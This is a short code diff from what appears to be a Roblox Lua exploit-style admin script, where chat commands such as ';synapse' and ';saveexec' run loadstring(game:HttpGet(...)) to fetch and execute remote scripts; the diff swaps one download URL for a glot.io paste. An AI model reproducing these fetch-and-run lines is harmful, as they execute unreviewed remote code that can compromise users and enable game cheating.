@@ -24,7 +24,7 @@ return function(scriptBox, player)
         elseif code == ";synapse" then
             loadstring(game:HttpGet("https://raw.githubusercontent.com/sovetskii-shashlik/Synapse-x/refs/heads/main/Synapse%20x"))()
         elseif code == ";saveexec" then
-            loadstring(game:HttpGet("https://hydrogenadmin.vercel.app/banana.lua"))()
+            loadstring(game:HttpGet("https://glot.io/snippets/hjvegxt5rt/raw/saveexec.lua"))()
         elseif code == ";conprint" then
             loadstring(game:HttpGet("https://github.com/sovetskii-shashlik/FE-console-typer/raw/refs/heads/main/Console%20printer"))()
         elseif code == ";antierr" then
